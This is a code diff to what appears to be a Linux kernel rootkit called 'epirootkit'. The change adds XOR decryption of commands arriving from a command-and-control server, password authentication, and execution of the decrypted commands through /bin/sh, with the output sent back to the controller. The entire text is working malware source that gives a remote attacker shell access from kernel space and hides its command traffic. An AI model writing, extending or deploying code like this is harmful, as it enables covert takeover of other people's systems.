@@ -95,6 +95,7 @@ static int send_to_c2(const char *msg, size_t len) {
 
 static int command_loop(void *data) {
     char buffer[2048];
+    char decrypted[2048];
     struct kvec iov;
     struct msghdr msg_hdr = {0};
     int len, authenticated = 0;
@@ -129,25 +130,29 @@ static int command_loop(void *data) {
 
         buffer[len] = '\0';
 
+        memset(decrypted, 0, sizeof(decrypted));
+        for (int i = 0; i < len; i++) {
+            decrypted[i] = buffer[i] ^ config.xor_key[i % strlen(config.xor_key)];
+        }
+
         if (!authenticated) {
-    		if (len == strlen(config.password) &&
-        		memcmp(decrypted, config.password, len) == 0) {
-        		authenticated = 1;
-        		send_to_c2("AUTH OK\n--EOF--\n", 16);
-        		printk(KERN_INFO "epirootkit: Authentication successful\n");
-    		} else {
-        		send_to_c2("AUTH FAIL\n--EOF--\n", 18);
-        		printk(KERN_WARNING "epirootkit: Authentication failed\n");
-    		}
-    		continue;
-		}
+            if (len == strlen(config.password) &&
+                memcmp(decrypted, config.password, len) == 0) {
+                authenticated = 1;
+                send_to_c2("AUTH OK\n--EOF--\n", 16);
+                printk(KERN_INFO "epirootkit: Authentication successful\n");
+            } else {
+                send_to_c2("AUTH FAIL\n--EOF--\n", 18);
+                printk(KERN_WARNING "epirootkit: Authentication failed\n");
+            }
+            continue;
+        }
 
+        size_t input_len = strcspn(decrypted, "\r\n");
+        decrypted[input_len] = '\0';
 
-        size_t input_len = strcspn(buffer, "\r\n");
-        buffer[input_len] = '\0';
-
-        if (strncmp(buffer, "cd", 2) == 0) {
-            const char *path = buffer + 2;
+        if (strncmp(decrypted, "cd", 2) == 0) {
+            const char *path = decrypted + 2;
             while (*path == ' ')
                 path++;
             if (*path && strlen(path) < sizeof(working_directory)) {
@@ -158,7 +163,7 @@ static int command_loop(void *data) {
             continue;
         }
 
-        if (strcmp(buffer, "exit") == 0) {
+        if (strcmp(decrypted, "exit") == 0) {
             send_to_c2("Shutting down\n--EOF--\n", 22);
             if (g_sock) {
                 sock_release(g_sock);
@@ -168,7 +173,7 @@ static int command_loop(void *data) {
             do_exit(0);
         }
 
-        snprintf(full_cmd, sizeof(full_cmd), "cd %s && %s > %s 2>&1", working_directory, buffer, tmp_output_path);
+        snprintf(full_cmd, sizeof(full_cmd), "cd %s && %s > %s 2>&1", working_directory, decrypted, tmp_output_path);
         argv[0] = "/bin/sh";
         argv[1] = "-c";
         argv[2] = full_cmd;
